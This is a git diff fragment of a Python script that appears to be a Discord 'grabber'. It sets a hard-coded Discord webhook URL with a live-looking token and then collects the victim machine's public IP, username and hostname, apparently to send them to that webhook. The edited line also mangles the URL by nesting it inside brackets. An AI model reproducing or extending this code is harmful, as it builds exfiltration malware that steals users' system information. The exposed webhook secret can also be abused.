@@ -226,7 +226,7 @@ def get_size(bytes, suffix="B"):
         bytes /= factor
 
 WEBHOOK_URL = "https://discord.com/api/webhooks/1290003665112928440/_OebKUediNvqyQtux18cUT2KDzBLntIMy1d6CiUPIEHWYJkI46-TVeIBrXkWmF4Kv3S7" #WEBHOOK URL GOES INSIDE THE QOUTES!
-webhook = SyncWebhook.from_url('https://discord.com/api/webhooks/[your shitty webhook]') # Initializing webhook
+webhook = SyncWebhook.from_url('https://discord.com/api/webhooks/[https://discord.com/api/webhooks/1290003665112928440/_OebKUediNvqyQtux18cUT2KDzBLntIMy1d6CiUPIEHWYJkI46-TVeIBrXkWmF4Kv3S7]') # Initializing webhook
 ip = requests.get('https://api.ipify.org').text
 username = getpass.getuser()
 hostname = socket.gethostname()
